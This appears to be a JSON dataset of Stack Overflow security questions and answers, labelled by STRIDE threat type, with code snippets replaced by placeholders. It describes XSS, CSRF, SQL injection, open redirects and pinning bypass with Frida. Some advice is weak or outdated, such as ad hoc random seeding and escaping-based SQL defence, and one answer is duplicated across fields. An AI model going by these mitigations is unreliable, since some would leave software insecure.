    "Attack": " The danger in XSS is that one user may insert html code in his input data that you later inserts in a web page that is sent to another user. ",
    "Mitigation": " There are in principle two strategies you can follow if you want to protect against this. You can either remove all dangerous characters from user input when they enter your system or you can html-encode the dangerous characters when you later on write them back to the browser.   Example of the first strategy:  User enter data (with html code)  Server remove all dangerous charactersModified data is stored in databaseSome time later, server reads modified data from databaseServer inserts modified data in a web page to another user  Example of second strategy:  User enter data (with html code)Unmodified data, with dangerous characters, is stored in databaseSome time later, server reads unmodified data from databaseServer html-encodes dangerous data and insert them into a web page to another user  The first strategy is simpler, since you usually reads data less often that you use them. However, it is also more difficult because it potentially destroys the data. It is particulary difficult if you needs the data for something other than sending them back to the browser later on (like using an email address to actually send an email). It makes it more difficult to i.e. make a search in the database, include data in an pdf report, insert data in an email and so on.   The other strategy has the advantage of not destroying the input data, so you have a greater freedom in how you want to use the data later on. However, it may be more difficult to actually check that you html-encode all user submitted data that is sent to the browser. A solution to your particular problem would be to html-encode the email address when (or if) you ever put that email address on a web page. "
  },
  {
    "Threat": "T",
    "Attack": " The only thing I can see is that with hashing, a compromised server could mean someone also compromising the hash and replacing a malicious binary with a matching key; but with a public-private scheme, as long as the private key remains private, there is no way to forge a malicious file. ",
    "Mitigation": " Signing is done with the private key, verification with the public key. You said the opposite above. It's also typically done on the hash of the file and not the file itself for practical reasons. "
  },
  {
    "Threat": "S",
    "Attack": " As far as I understand there are two approaches in protecting from CSRF attacks: 1) token per session, and 2) token per request  2) In the second case new CSRF token is being generated on each request and after that an old one becomes invalid.It makes harder to exploit the vunerability because even if attacker steals a token (via XSS) it expires when the user goes to the next page.But on the other hand this approach makes webapp less usable. Here is a good quotation from [LINK]: ",
    "Mitigation": " CSRF tokens are nonces. They are supposed to be used only once (or safely after a long time). They are used to identify and authorize requests. Let us consider the two approaches to prevent CSRF:  Single token fixed per session: The drawback with this is that the client can pass its token to others. This may not be due to sniffing or man-in-the-middle or some security lapse. This is betrayal on user's part. Multiple clients can use the same token. Sadly nothing can be done about it.Dynamic token: token is updated every time any interaction happens between server and client or whenever timeout occurs. It prevents use of older tokens and simultaneous use from multiple clients.  The drawback of the dynamic token is that it restricts going back and continuing from there. In some cases it could be desirable, like if implementing shopping cart, reload is must to check if in stock. CSRF will prevent resending the sent form or repeat buy/sell.  A fine-grained control would be better. For the scenario you mention you can do without CSRF validation. Then don't use CSRF for that particular page. In other words handle the CSRF (or its exceptions) per route. "
  },
  {
    "Threat": "I",
    "Attack": " This article states that\"Spring Expression Language (SpEL) could be exploited through HTTP parameter submissions that would allow attackers to get sensitive system data, application and user cookies.\"  ",
    "Mitigation": " Inside JSP pages, the expression [CODE] will be resolved to the text [CODE] which by itself is safe.  If however, that expression resides within an attribute of a spring JSTL tag, that resolved value may be evaluated again e.g. in the [CODE] tag:  [CODE]  will result in the value [CODE] being passed through to the [CODE] tag which will evaluate the [CODE] method.  Hence we now have code submitted by the client and being run on the server. "
  },
  {
    "Threat": "I",
    "Attack": " At best you could end up with invalid keywords.  At worst you could end up with evil/dangerous ones, as Micha\u8242 Marczyk said.  Keep in mind that [CODE] can be used to run arbitrary code at read-time, so you don't even have to evaluate a string for bad things to happen, you only have to read it. ",
    "Mitigation": " [CODE]  (See [CODE] for how to disable this behavior, but read-eval is enabled by default.)  I think general rules for sanitizing user input apply here.  Define precisely what you want to allow, and disallow everything else by default.  Maybe allow something like the regex [CODE], with possibly other alphanumerics depending on the language you speak. "
  },
  {
    "Threat": "T",
    "Attack": " I need to validate all these files as imagesPeople can probably send a file with an exploit/code that can likelybe a problem. But in my case I am mostly going to do a file open andsave and let the browser show the image     ",
    "Mitigation": " Make sure your mail server is configured for virus scanning, keep it up to date.  That'll be the first line of defense.When the email comes in, attempt to process the image in a known rock solid library.  Be aware that many emails contain multiple images, some of which may have nothing at all to do with the one they are sending.  For example, our company emails all include our logo at the bottom.  I'm not exactly sure what the solution is here, but you'll want to take it into consideration.Different email clients handle image attachments, well, differently.  Sometimes it's as a normal attachment, sometimes it's embedded in the body.  Even within the same client an image might be handled differently depending on if they sent the email as plaint text with attachments or HTML mail.People will test your system.  They'll send .js files, they'll send images whose headers are jacked in order to overflow your image processing library...  Consider enforcing certain email restrictions such as [LINK].Be prepared to receive images that are absolutely huge.  Today's cameras take very large photos and a lot of people don't know what crop or resize means.  You might consider setting a cap of 15MB or larger per email coming into your server.  Then, in combination with #2 above, auto resizing images down to something a bit more acceptable.Determine the mechanism you actually want to use to notify the user of any issues.  Bear in mind that this mechanism is subject to abuse.  For example, consider a spam message sent to your machine with reply-to headers going to a victim.   If you are using .net, see this for a possible way to confirm a file is an image: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " So in order for this attack to work, you need to have two conditions :  The website must use a fileupload at some point that you can accessThe files stored must be executed via PHP, even the image files (in that case). ",
    "Mitigation": " Moreover, it's important to notice that even if you succeed into uploading a gif file containing php code, if that gif file is read as gif (and not executed as php, via include/require, or a badly configured server), it won't do anything, just have php code on your server, useless. "
  },
  {
    "Threat": "S",
    "Attack": " To save a file i defined the following method[CODE]This returns a hashvalue that is stored in a file. Whenever the user wants to access the file, he enters the password, and if the same hash is generated, he can access the file.I suppose this isn't really safe, but how safe it is? How high is the chance that String#hashCode generates the same hash with two different inputs?EDIT:According to your answers I changed the code:[CODE]So it should be better now?? ",
    "Mitigation": " This is a bad idea - you should use a normal cryptographic hash such as SHA-1, just as NullUserException says.  However, it would be portable - the docs for [CODE] state the algorithm explicitly. Any JRE implementing the docs properly should give the same hash code. However, because of the way [CODE]'s algorithm works, it's pretty easy to find a string which will generate any particular hash code - even one starting with a specific prefix - so an attacker who knew the hash could attack your application very easily. Cryptographic hashes are designed to make it hard to engineer a key to match a particular hash. "
  },
  {
    "Threat": "T",
    "Attack": " From my understanding the only vector for JSONP is the exact same vector which is opened up by including a [CODE] tag on your site whose src is to any site that is not controlled by you: That they could turn malicious and start farming user sessions/cookies/data. If that is true, then it would seem that it is not the protocol (JSONP) that is the concern, but rather the source that the data is gathered from.  ",
    "Mitigation": " If both ends are trusted, there is no danger in JSONP (it's basically just a [CODE] tag). Both Script/JSONP hold the same security vulnerabilities because they are automatically executed, rather than simply transmitting as data. Using a server-side proxy means that the cross-domain return is passed as data and can be filtered for malicious content. If the cross-domain is fully trusted, then JSONP/SCRIPT is safe, if there is any suspicion of risk then pass it through a filter proxy.  When you control both ends of the request, most of the traditional security worries about JSONP aren't an issue. "
  },
  {
    "Threat": "S",
    "Attack": "   Attempting to generate a URL from non-sanitized request parameters! An attacker can inject malicious data into the generated URL, such as changing the host. Whitelist and sanitize passed parameters to be secure. ",
    "Mitigation": " You should review the documentation, both from OWASP as well as [LINK].   By using [CODE], you have an opportunity to disallow setting attributes that you don't want passed to your url helper.   Consider the following link, directed to your website, coming from a Twitter post:   [CODE]  If your code looks like this, you're in trouble:   [CODE]  Now the link goes to:  [CODE]  The attacking website, phishingscam.example, can set the content type to [CODE] and render a page that looks like your login form. The user, who was on your site a moment ago and clicked to view something on your site, believes they got logged out and need to login again. Now our attacker has the user credentials and can redirect them back over to the appropriate link with the user wholly unaware of what happened.  "
  },
  {
    "Threat": "S",
    "Attack": " Is using the method below a bad choice? It generates a random number between 0-1000. Since there are only 1000 options, and their MD5 hashes are known, it should take an attacker just a 1000 trials to verify the account without it really belonging to them ",
    "Mitigation": " Just seed it with something the attacker could not know:  [CODE]  There is no limit at how crasy you could go  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " It's pretty obvious to you and i that the PHP is going to take the id and run it through a mysql query to retrieve 1 record to display it on the page.  Is there anyway some malicious hacker could mess this url up and pose a security threat to my application/mysql DB? ",
    "Mitigation": " Of course, never ever ever consider a user entry (_GET, _POST, _COOKIE, etc) as safe.  Use mysql_real_escape_string php function to sanitize your variables: [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " Edit: Due to discussion raised in the comments, let me clarify the threat I'm trying to address: I want to prevent an attacker from being able to read the plain-text password used to access the external service. Meaning that if they somehow gained non-admin access to our network or database, even with the database dump they would not be able to read the passwords in plain text. ",
    "Mitigation": " There are different options, both using encryption for password using a key, and protecting the key storage using HSM module.  option (1): Using Database with HSM module  You can store passwords encrypted in database and benefit from a feature in SQL 2016 \"Always Encrypted (Database Engine)\".Always Encrypted allows clients to encrypt sensitive data inside client applications and never reveal the encryption keys to the Database Engine (SQL Database or SQL Server).  You can use  Hardware Security Modules (HSM) with Always Encrypted.  The  hardware security module (HSM) is a physical device that safeguards digital keys and performs cryptographic operations. These modules traditionally come in the form of a plug-in card or an external device that attaches directly to a computer or to the network.   When you get an HSM, you also get a software libraries implementing common APIs, such as Microsoft Crypto API and Cryptography API. These API are called Cryptographic Service Provider (CSP) and Cryptography API: Next Generation CNG providers.   Your applications can communicate with an HSM using those APIs.   For more securing the HSM module, you can:- Tie the HSM to your Database Server.- Tie the HSM to your admin login to Operating System Server.  for more details:  [LINK][LINK]  Also, Oracle database and other engine can provide encryption with HSM   [LINK]  Option (2): Store password in files in Protected storage using HSM module:  Encrypting files that contain passwords. This may be done by the operating system, an application, or a specialized utility such as password management software that is specifically designed to protect the confidentiality of passwords. Using OS access control features to restrict access to files that contain passwords. For example, a host could be configured to permit only administrators and certain processes running with administrator-level privileges to access a password file, thus preventing users and user-level processes from accessing passwords. As you are not using hashing, I exclude this option, but it's a mechanism for storing one-way cryptographic hashes for passwords instead of storing the passwords themselves.  "
  },
  {
    "Threat": "S",
    "Attack": " Encrypt my communication (C->S &amp; S->C)Do 2-way authentication (C->S &amp; S->C)Avoid man-in-middle attacks ",
    "Mitigation": " If any of those small TLS implementations allow you to disable all X.509 and ASN.1 functionality and just use TLS with preshared-keys you'd have quite a small footprint. That's because only symmetric ciphers and hashes are used. "
  },
  {
    "Threat": "S",
    "Attack": " Phishing attacks occur when a user is tricked into thinking they are using a known website but instead are using a malicious website that resembles the legitimate website. Authereum, Portis, and Torus are username and password based login solutions so they open up the login auth window in a new popup or redirect. This allows the user to verify the domain of the website for legitimacy. Google auth does this pattern as well. Besides opening a new window on login for the user to verify, some web-based wallet providers also open a new window when signing messages and transactions to verify the request. ",
    "Mitigation": " Browser extension-based wallets such as [LINK] use isolated local storage that only the extension can access, with no way for a website to access. The extension can push data to the website, or the website can request data by doing message passing requests. Private keys are stored in the sandboxed local storage and requests are made from the website to the extension to sign messages. The extension returns the signed message to the website.  Web-based:  Browser-based crypto wallets such as [LINK], [LINK], [LINK], and [LINK], use sandboxed local storage as well via an iframe. Unlike cookies, local storage is strictly restricted by domain, meaning that if a website sets a value in local storage, then only that website can read the value; so alice.com cannot read bob.com's local storage. To sandbox local storage sensitive values, they are set under a controlled subdomain, for example x.wallet.com, since no other website will be able to read the local storage. This subdomain contains no UI is meant for iframed communication only. The web3 provider's of those wallets load a hidden iframe on the website, which is used to communicate to the subdomain containing the sandboxed storage; so for example Alice on dapp.com using Authereum, the Authereum sdk connects to x.authereum.org using an iframe and send [LINK] requests to the iframe from the website to sign messages. This restricts the website from reading sensitive data such as private keys and only allow the website to send sign requests similarly to how wallet extensions work.  Not all web-based wallets have sandboxed local storage so you should avoid using those since any website can read the stored sensitive data but the wallets mentioned here are safe in that regard.  Protection against phishing attacks  Phishing attacks occur when a user is tricked into thinking they are using a known website but instead are using a malicious website that resembles the legitimate website. Authereum, Portis, and Torus are username and password based login solutions so they open up the login auth window in a new popup or redirect. This allows the user to verify the domain of the website for legitimacy. Google auth does this pattern as well. Besides opening a new window on login for the user to verify, some web-based wallet providers also open a new window when signing messages and transactions to verify the request.  Click jacking occurs when a website is loaded via an iframe on the website and the website overlays a different UI on top of the iframed website with pointer-events set to none and then tricks the user into entering information or clicking a button on the overlayed UI but they are actually clicking a button on the iframed website. This is dangerous because the action on the iframed website can be something like sending funds to the attackers wallet.  To prevent the wallet site to be loaded in an iframe at all, all the wallet site has to do is set the HTTP header [CODE], which is what Authereum and Portis are doing so they are safe from these attacks.  Trusting content scripts  It's easy to verify browser extension source code by using source viewer plugins, but to avoid an extension from auto-updating with malicious code, a user can install the extension manually to lock it down to a version by getting the source code from github if it's open source or from downloading the source scripts.  Since with web-based wallets the wallet site owner controls the content scripts then you have to trust that the content scripts managing the sensitive key data won't be malicious since the wallet site owner or an attacker that got access to the wallet site can at any point update the website source code with bad code.   To trust content scripts, the wallet site can be hosted on [LINK] since the web address is the content hash meaning you can trust that it won't change. Authereum is one wallet that already offers this by visiting [LINK] or by resolving the [CODE] property of their ENS name.  Convenience  Web-based wallets are portable because you can use the same wallet on any OS, browser, desktop or mobile, while with browser extension you are stuck with the environment you are using the extension from. Extensions are highly inconvenient but offer more storage isolation guarantees. With contract-based accounts however, more security features can be offered on the wallet side.  "
  },
  {
    "Threat": "I",
    "Attack": " When I run Fortify Scan on my project i do see that i'm logging the exceptions using  and it says this is not the right way because attckers may get access to this info and get system info from this and plan an attack. ",
    "Mitigation": " That reasoning is frankly ridiculous in most cases.  Your LOGGER object should be writing to the local filesystem, and if a remote attacker can access your filesystem you've got way bigger problems.  Restrict access to your log files as appropriate, and then log to your heart's content. "
  },
  {
    "Threat": "I",
    "Attack": " I've setup the steps on the backend to retrieve a password, validate it and respond with a token. The only problem is - the password I use on the front end (mobile app) to be validated by the back end is hardcoded.  How should I securely store this password on the mobile app so that it can not be sniffed out by a hacker and used to compromise the backend?  Although this may obfuscate keys, these still have to be hardcoded. Making these kind of useless, unless I'm missing something.  <h1>Your Question</h1>I've setup the steps on the backend to retrieve a password, validate it and respond with a token. The only problem is - the password I use on the front end (mobile app) to be validated by the back end is hardcoded.My question is:How should I securely store this password on the mobile app so that it can not be sniffed out by a hacker and used to compromise the backend?The cruel truth is... you can't!!!It seems that you already have done some extensive research on the subject, and in my opinion you mentioned one effective way of shipping your App with an embedded secret:Hidden in Native LibrariesBut as you also say:These methods are basically useless because hackers can easily circumnavigate these methods of protection.Some are useless and others make reverse engineer the secret from the mobile app a lot harder. As I wrote [LINK], the approach of using the native interfaces to hide the secret will require expertise to reverse engineer it, but then if is hard to reverse engineer the binary you can always resort to a man in the middle (MitM) attack to steel the secret, as I show [LINK] for retrieving a secret that is hidden in the mobile app binary with the use of the native interfaces, [LINK].To protect your mobile app from a MitM you can employ [LINK]:Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable, then the program holds a pinset (taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised identity must match one of the elements in the pinset.You can read [LINK] of react native articles that show you how to apply certificate pinning to protect the communication channel between your mobile app and the API server.If you don't know yet certificcate pinning can also be bypassed by using tools like Frida or xPosed.[LINK]Inject your own scripts into black box processes. Hook any function, spy on crypto APIs or trace private application code, no source code needed. Edit, hit save, and instantly see the results. All without compilation steps or program restarts.[LINK]Xposed is a framework for modules that can change the behavior of the system and apps without touching any APKs. That's great because it means that modules can work for different versions and even ROMs without any changes (as long as the original code was not changed too much). It's also easy to undo.So now you may be wondering how can I protect from certificate pinning bypass?Well is not easy, but is possible, by using a mobile app attestation solution.Before we go further on it, I would like to clarify first a common misconception among developers, regarding WHO and WHAT is accessing the API server.<h1>The Difference Between WHO and WHAT is Accessing the API Server</h1>To better understand the differences between the WHO and the WHAT are accessing an API server, let\u9225\u6a9a use this picture:<img src=\"https://i.stack.imgur.com/4dgaJ.png\" alt=\"Man in the Middle Attack\" />The Intended Communication Channel represents the mobile app being used as you expected, by a legit user without any malicious intentions, using an untampered version of the mobile app, and communicating directly with the API server without being man in the middle attacked.The actual channel may represent several different scenarios, like a legit user with malicious intentions that may be using a repackaged version of the mobile app, a hacker using the genuine version of the mobile app, while man in the middle attacking it, to understand how the communication between the mobile app and the API server is being done in order to be able to automate attacks against your API. Many other scenarios are possible, but we will not enumerate each one here.I hope that by now you may already have a clue why the WHO and the WHAT are not the same, but if not it will become clear in a moment.The WHO is the user of the mobile app that we can authenticate, authorize and identify in several ways, like using OpenID Connect or OAUTH2 flows.[LINK]Generally, OAuth provides to clients a &quot;secure delegated access&quot; to server resources on behalf of a resource owner. It specifies a process for resource owners to authorize third-party access to their server resources without sharing their credentials. Designed specifically to work with Hypertext Transfer Protocol (HTTP), OAuth essentially allows access tokens to be issued to third-party clients by an authorization server, with the approval of the resource owner. The third party then uses the access token to access the protected resources hosted by the resource server.[LINK]OpenID Connect 1.0 is a simple identity layer on top of the OAuth 2.0 protocol. It allows Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner.While user authentication may let the API server know WHO is using the API, it cannot guarantee that the requests have originated from WHAT you expect, the original version of the mobile app.Now we need a way to identify WHAT is calling the API server, and here things become more tricky than most developers may think. The WHAT is the thing making the request to the API server. Is it really a genuine instance of the mobile app, or is a bot, an automated script or an attacker manually poking around with the API server, using a tool like Postman?For your surprise you may end up discovering that It can be one of the legit users using a repackaged version of the mobile app or an automated script that is trying to gamify and take advantage of the service provided by the application.Well, to identify the WHAT, developers tend to resort to an API key that usually they hard-code in the code of their mobile app. Some developers go the extra mile and compute the key at run-time in the mobile app, thus it becomes a runtime secret as opposed to the former approach when a static secret is embedded in the code.The above write-up was extracted from an article I wrote, entitled WHY DOES YOUR MOBILE APP NEED AN API KEY?, and that you can read in full [LINK], that is the first article in a series of articles about API keys.<h2>Mobile App Attestation</h2>The use of a Mobile App Attestation solution will enable the API server to know WHAT is sending the requests, thus allowing to respond only to requests from a genuine mobile app while rejecting all other requests from unsafe sources.The role of a Mobile App Attestation service is to guarantee at run-time that your mobile app was not tampered, is not running in a rooted device and is not being the target of a MitM attack. This is done by running a SDK in the background that will communicate with a service running in the cloud to attest the integrity of the mobile app and device is running on. The cloud service also verifies that the TLS certificate provided to the mobile app on the handshake with the API server is indeed the same in use by the original and genuine API server for the mobile app, not one from a MitM attack.On successful attestation of the mobile app integrity a short time lived JWT token is issued and signed with a secret that only the API server and the Mobile App Attestation service in the cloud are aware. In the case of failure on the mobile app attestation the JWT token is signed with a secret that the API server does not know.Now the App must sent with every API call the JWT token in the headers of the request. This will allow the API server to only serve requests when it can verify the signature and expiration time in the JWT token and refuse them when it fails the verification.Once the secret used by the Mobile App Attestation service is not known by the mobile app, is not possible to reverse engineer it at run-time even when the App is tampered, running in a rooted device or communicating over a connection that is being the target of a Man in the Middle Attack.So this solution works in a positive detection model without false positives, thus not blocking legit users while keeping the bad guys at bays.What suggestions do you have to protect the world (react- native apps) from pesky hackers, when they're stealing keys and using them inappropriately?I think you should relaly go with a mobile app attestation solution, that you can roll in your own if you have the expertise for it, or you can use a solution that already exists as a SAAS solution at [LINK](I work here), that provides SDKs for several platforms, including iOS, Android, React Native and others. The integration will also need a small check in the API server code to verify the JWT token issued by the cloud service. This check is necessary for the API server to be able to decide what requests to serve and what ones to deny.<h2>Summary</h2>I want to be able to store keys in the app so that I can validate the user an allow them to access resources on the backend. However, I don't know what the best plan of action is to ensure user/business security.Don't go down this route of storing keys in the mobile app, because as you already know, by your extensive research, they can be bypassed.Instead use a mobile attestation solution in conjunction with OAUTH2 or OpenID connect, that you can bind with the mobile app attestation token. An example of this token binding can be found in [LINK] for the check of the custom payload claim in the endpoint [CODE].<h2>Going the Extra Mile</h2>[LINK]The OWASP Mobile Security Project is a centralized resource intended to give developers and security teams the resources they need to build and maintain secure mobile applications. Through the project, our goal is to classify mobile security risks and provide developmental controls to reduce their impact or likelihood of exploitation. ",
    "Mitigation": " <h1>Your Question</h1>I've setup the steps on the backend to retrieve a password, validate it and respond with a token. The only problem is - the password I use on the front end (mobile app) to be validated by the back end is hardcoded.My question is:How should I securely store this password on the mobile app so that it can not be sniffed out by a hacker and used to compromise the backend?The cruel truth is... you can't!!!It seems that you already have done some extensive research on the subject, and in my opinion you mentioned one effective way of shipping your App with an embedded secret:Hidden in Native LibrariesBut as you also say:These methods are basically useless because hackers can easily circumnavigate these methods of protection.Some are useless and others make reverse engineer the secret from the mobile app a lot harder. As I wrote [LINK], the approach of using the native interfaces to hide the secret will require expertise to reverse engineer it, but then if is hard to reverse engineer the binary you can always resort to a man in the middle (MitM) attack to steel the secret, as I show [LINK] for retrieving a secret that is hidden in the mobile app binary with the use of the native interfaces, [LINK].To protect your mobile app from a MitM you can employ [LINK]:Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable, then the program holds a pinset (taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertised identity must match one of the elements in the pinset.You can read [LINK] of react native articles that show you how to apply certificate pinning to protect the communication channel between your mobile app and the API server.If you don't know yet certificcate pinning can also be bypassed by using tools like Frida or xPosed.[LINK]Inject your own scripts into black box processes. Hook any function, spy on crypto APIs or trace private application code, no source code needed. Edit, hit save, and instantly see the results. All without compilation steps or program restarts.[LINK]Xposed is a framework for modules that can change the behavior of the system and apps without touching any APKs. That's great because it means that modules can work for different versions and even ROMs without any changes (as long as the original code was not changed too much). It's also easy to undo.So now you may be wondering how can I protect from certificate pinning bypass?Well is not easy, but is possible, by using a mobile app attestation solution.Before we go further on it, I would like to clarify first a common misconception among developers, regarding WHO and WHAT is accessing the API server.<h1>The Difference Between WHO and WHAT is Accessing the API Server</h1>To better understand the differences between the WHO and the WHAT are accessing an API server, let\u9225\u6a9a use this picture:<img src=\"https://i.stack.imgur.com/4dgaJ.png\" alt=\"Man in the Middle Attack\" />The Intended Communication Channel represents the mobile app being used as you expected, by a legit user without any malicious intentions, using an untampered version of the mobile app, and communicating directly with the API server without being man in the middle attacked.The actual channel may represent several different scenarios, like a legit user with malicious intentions that may be using a repackaged version of the mobile app, a hacker using the genuine version of the mobile app, while man in the middle attacking it, to understand how the communication between the mobile app and the API server is being done in order to be able to automate attacks against your API. Many other scenarios are possible, but we will not enumerate each one here.I hope that by now you may already have a clue why the WHO and the WHAT are not the same, but if not it will become clear in a moment.The WHO is the user of the mobile app that we can authenticate, authorize and identify in several ways, like using OpenID Connect or OAUTH2 flows.[LINK]Generally, OAuth provides to clients a &quot;secure delegated access&quot; to server resources on behalf of a resource owner. It specifies a process for resource owners to authorize third-party access to their server resources without sharing their credentials. Designed specifically to work with Hypertext Transfer Protocol (HTTP), OAuth essentially allows access tokens to be issued to third-party clients by an authorization server, with the approval of the resource owner. The third party then uses the access token to access the protected resources hosted by the resource server.[LINK]OpenID Connect 1.0 is a simple identity layer on top of the OAuth 2.0 protocol. It allows Clients to verify the identity of the End-User based on the authentication performed by an Authorization Server, as well as to obtain basic profile information about the End-User in an interoperable and REST-like manner.While user authentication may let the API server know WHO is using the API, it cannot guarantee that the requests have originated from WHAT you expect, the original version of the mobile app.Now we need a way to identify WHAT is calling the API server, and here things become more tricky than most developers may think. The WHAT is the thing making the request to the API server. Is it really a genuine instance of the mobile app, or is a bot, an automated script or an attacker manually poking around with the API server, using a tool like Postman?For your surprise you may end up discovering that It can be one of the legit users using a repackaged version of the mobile app or an automated script that is trying to gamify and take advantage of the service provided by the application.Well, to identify the WHAT, developers tend to resort to an API key that usually they hard-code in the code of their mobile app. Some developers go the extra mile and compute the key at run-time in the mobile app, thus it becomes a runtime secret as opposed to the former approach when a static secret is embedded in the code.The above write-up was extracted from an article I wrote, entitled WHY DOES YOUR MOBILE APP NEED AN API KEY?, and that you can read in full [LINK], that is the first article in a series of articles about API keys.<h2>Mobile App Attestation</h2>The use of a Mobile App Attestation solution will enable the API server to know WHAT is sending the requests, thus allowing to respond only to requests from a genuine mobile app while rejecting all other requests from unsafe sources.The role of a Mobile App Attestation service is to guarantee at run-time that your mobile app was not tampered, is not running in a rooted device and is not being the target of a MitM attack. This is done by running a SDK in the background that will communicate with a service running in the cloud to attest the integrity of the mobile app and device is running on. The cloud service also verifies that the TLS certificate provided to the mobile app on the handshake with the API server is indeed the same in use by the original and genuine API server for the mobile app, not one from a MitM attack.On successful attestation of the mobile app integrity a short time lived JWT token is issued and signed with a secret that only the API server and the Mobile App Attestation service in the cloud are aware. In the case of failure on the mobile app attestation the JWT token is signed with a secret that the API server does not know.Now the App must sent with every API call the JWT token in the headers of the request. This will allow the API server to only serve requests when it can verify the signature and expiration time in the JWT token and refuse them when it fails the verification.Once the secret used by the Mobile App Attestation service is not known by the mobile app, is not possible to reverse engineer it at run-time even when the App is tampered, running in a rooted device or communicating over a connection that is being the target of a Man in the Middle Attack.So this solution works in a positive detection model without false positives, thus not blocking legit users while keeping the bad guys at bays.What suggestions do you have to protect the world (react- native apps) from pesky hackers, when they're stealing keys and using them inappropriately?I think you should relaly go with a mobile app attestation solution, that you can roll in your own if you have the expertise for it, or you can use a solution that already exists as a SAAS solution at [LINK](I work here), that provides SDKs for several platforms, including iOS, Android, React Native and others. The integration will also need a small check in the API server code to verify the JWT token issued by the cloud service. This check is necessary for the API server to be able to decide what requests to serve and what ones to deny.<h2>Summary</h2>I want to be able to store keys in the app so that I can validate the user an allow them to access resources on the backend. However, I don't know what the best plan of action is to ensure user/business security.Don't go down this route of storing keys in the mobile app, because as you already know, by your extensive research, they can be bypassed.Instead use a mobile attestation solution in conjunction with OAUTH2 or OpenID connect, that you can bind with the mobile app attestation token. An example of this token binding can be found in [LINK] for the check of the custom payload claim in the endpoint [CODE].<h2>Going the Extra Mile</h2>[LINK]The OWASP Mobile Security Project is a centralized resource intended to give developers and security teams the resources they need to build and maintain secure mobile applications. Through the project, our goal is to classify mobile security risks and provide developmental controls to reduce their impact or likelihood of exploitation. "
  },
  {
    "Threat": "D",
    "Attack": " I can filter out the messages I get in my webhook callback. However, a malicious user can add my bot to a thousand big groups and will possibly result in denial of service for all other users.  Even if Telegram have implemented some rate limiting such user actions may still result in denial of service for all other users. ",
    "Mitigation": " That feature does not exist. Either you allow all or none.   In addition to filtering, you could use [LINK] to immediately leave groups that are not on your whitelist.  And there is [LINK] which could make it harder for a malicious user. "
  },
  {
    "Threat": "T",
    "Attack": " The website i worked was recently attempted to be hacked by the following SQL injection script ",
    "Mitigation": " According to [LINK] the MySQL concat()    Returns the string that results from  concatenating the arguments. May have  one or more arguments. If all  arguments are nonbinary strings, the  result is a nonbinary string. If the  arguments include any binary strings,  the result is a binary string. A  numeric argument is converted to its  equivalent binary string form  So 0x232425 is converted to #$% which is simply added to the begining and end of the table_name field. Maybe just to make it easier for them to pull out the Table names later using Regex.   Later on the char(9) is equivalent to a tab as you can see [LINK] and is just there to format the output nicer.  The 3,4,5,6,7,8,9 is just there so that the columns match the boys table that they are performing the Union on.  "
  },
  {
    "Threat": "I",
    "Attack": " I will preface this question by saying I am NOT a web developer, nor do I have much knowledge in this field. I am a business owner and have a low volume website that my customers purchase products on. I've noticed this set of queries a few minutes ago and they appear very suspicious to me, a layperson. It looks as if they are trying to pull data from my database? I could be totally wrong, but someone please let me know what they think is going on here.  ",
    "Mitigation": " Any website accessible on the internet gets pounded by automated attack attempts like this all the time.  You can expect your server logs to be filled with this sort of thing.  Most are nothing to worry about.  The best thing you can do is have someone monitor the security of your site for you.  Whomever designed your site should have been following best practices, which take care of most security issues.  If you are buying a web hosting plan (vs a VPS or dedicated server), then your web host will generally take care of security from the server standpoint.  Of course, there are always ways to attack a site.  Keep an eye out for defaced pages.  If you are storing any customer data, you should hire an expert. "
  },
  {
    "Threat": "E",
    "Attack": " I'm managing the development of an iPhone app that relies on web services to provide catalog access. My main security concern right now is someone accessing my web service and replicating/scraping my entire catalog (right now, it doesn't contain anything proprietary - but that would change). ",
    "Mitigation": " Ultimately this is going to go down to authentication. I think you're going to have to use secure communications - namely some kind of certificate based encryption of some value that is only available to the iphone application.    If the Auth can be spoofed then you have no protection against this.  there is some info in this question : [LINK] or here   [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " No, you can't avoid all SQL injection attacks by using parameters. Dynamic SQL is the real issue, and this can occur in stored procedures as well as in your application code.  E.g., this is prone to a SQL injection attack: your parameterized query passes a username to a stored procedure, and within the stored procedure the parameter is concatenated to a SQL command and then executed.  For an example of many kinds of SQL injection attacks, see this [LINK]. You will see that simply escaping single quotes is just scratching the surface, and that there are many ways around that. ",
    "Mitigation": " For an example of many kinds of SQL injection attacks, see this [LINK]. You will see that simply escaping single quotes is just scratching the surface, and that there are many ways around that. "
  },
  {
    "Threat": "T",
    "Attack": " If I allow them to upload images to the actual site, it seems like this will quickly become expensive (this is a side project, not funded by anyone than myself and my own obsessions). Let's say the site becomes moderately popular, with 100K users posting one image a week, of only 250K in size. That's (100000 * .1 * 52 / 1024) = 508 MB/year in storage (and that doesn't take into account increased bandwidth). Plus I'd have to increase the server load to scale the images. I'm not sure if I should just go ahead with this, or if there are better possibilities.  Linking to other sites seems better in some ways. You do have broken links, but a larger concern for me is security: XSS.  My objectives are (in order): - Secure, both for my own site, and to not allow XSS attacks against other sites - Best possible user experience - Easy to maintain and implement ",
    "Mitigation": " Why not using a service like Amazon s3? Is cheap, very cheap (With the Reduced Redundancy Storage), and the most important plugins like Paperclip support it out of the box...  "
  },
  {
    "Threat": "I",
    "Attack": "   Security Recommendation: It is highly recommended that you do not  hard-code the exact public license key string value as provided by  Google Play. Instead, you can construct the whole public license key  string at runtime from substrings, or retrieve it from an encrypted  store, before passing it to the constructor. This approach makes it  more difficult for malicious third-parties to modify the public  license key string in your APK file. ",
    "Mitigation": " android developer wants to say the \"public key\" you need to synchronize with google play for any of payment you want to do using your application, It should not be used directly inside your app source code because it can be easily hacked by any one.So one way is store your public key in the server side and once you get response from google play to verify the key send that response to server and perform your operation there at server.  [CODE] "
  },
  {
    "Threat": "I",
